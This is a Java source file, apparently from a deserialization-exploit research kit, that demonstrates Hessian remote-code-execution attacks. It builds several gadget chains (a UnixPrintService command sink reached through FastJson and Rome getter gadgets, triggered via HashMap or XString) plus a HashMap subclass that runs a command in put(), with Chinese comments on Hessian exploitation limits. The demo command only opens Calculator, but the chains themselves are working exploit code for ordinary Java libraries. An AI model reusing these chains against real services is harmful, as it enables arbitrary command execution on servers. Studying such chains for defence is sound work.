package xyz.eki.marshalexp.solution;

import com.caucho.hessian.io.Hessian2Output;
import com.caucho.hessian.io.HessianProtocolException;
import xyz.eki.marshalexp.gadget.fastjson.GFastJson;
import xyz.eki.marshalexp.gadget.jdk.*;
import xyz.eki.marshalexp.gadget.rome.GRome;
import xyz.eki.marshalexp.utils.MiscUtils;
import xyz.eki.marshalexp.utils.SerializeUtils;

import java.io.ByteArrayOutputStream;
import java.util.HashMap;

public class HessianWays {

    public static String cmd = "open -a Calculator";

    //Hessian 主要利用Map的put方法，相对比原生反序列化的利用链，有几个限制：
    //
    //kick-off chain 起始方法只能为 hashCode/equals/compareTo 方法；
    //利用链中调用的成员变量不能为 transient 修饰；
    //所有的调用不依赖类中 readObject 的逻辑，也不依赖 getter/setter 的逻辑。

    public static class MyHashMap<K, V> extends HashMap<K, V> {

        String folder;
        int storingTimer;

//        private  MyHashMap(String folder, int storingTimer){
//            this.folder = folder;
//            this.storingTimer = storingTimer;
//        }
        public V put(K key, V value) {
            super.put(key, value);
            System.out.println(111111111);
            try{
                Runtime.getRuntime().exec("open -a Calculator.app");
            }catch (Exception e){}
            System.out.println(22222222);
            return  null;
        }
    }

    public static void case1() throws Exception{
        MyHashMap exp = new MyHashMap();
        exp.put("1", "1");

        byte[] bytes = SerializeUtils.hessianLiteSerialize(exp);

        Object re = SerializeUtils.hessianLiteDeserialize(bytes);

        System.out.println(re.getClass().getName());
    }

    public static void case2() throws Exception{
        Object sink = GUnixPrintService.getDefaultPrintService2RCE(cmd);
//        Object gadget = GRome.toString2GetterSynd(sink);
//        Object source = GHashMap.deserialize2HashCode(gadget,gadget);
        Object gadget = GFastJson.toString2Getter(sink);
        Object source = GXString.deserialize2ToString(gadget);

        SerializeUtils.hessianLiteDeserialize(SerializeUtils.hessianLiteSerialize(source));

//        System.out.println(MiscUtils.executeCommand("ls /tmp"));
    }

    public static void case3() throws Exception{
        Object sink = GUnixPrintService.getDefaultPrintService2RCE(cmd);
        Object gadget = GRome.toString2GetterSynd(sink);
        Object source = GHashMap.deserialize2HashCode(gadget,gadget);

        SerializeUtils.hessianLiteDeserialize(SerializeUtils.hessianLiteSerialize(source));

//        System.out.println(MiscUtils.executeCommand("ls /tmp"));
    }

    public static void case4() throws Exception{
        Object sink = GUnixPrintService.getDefaultPrintService2RCE(cmd);
        Object gadget = GRome.toString2GetterSynd(sink);
//        try {
            SerializeUtils.hessian2Deserialize(SerializeUtils.hessian2SerializeThrowExpectToString(gadget));
//        }catch (HessianProtocolException ignored){
//            ignored.printStackTrace();
//        }
//        System.out.println(MiscUtils.executeCommand("ls /tmp"));
    }
        
    public static void main(String[] args) throws Exception{
        case3();
    }
}
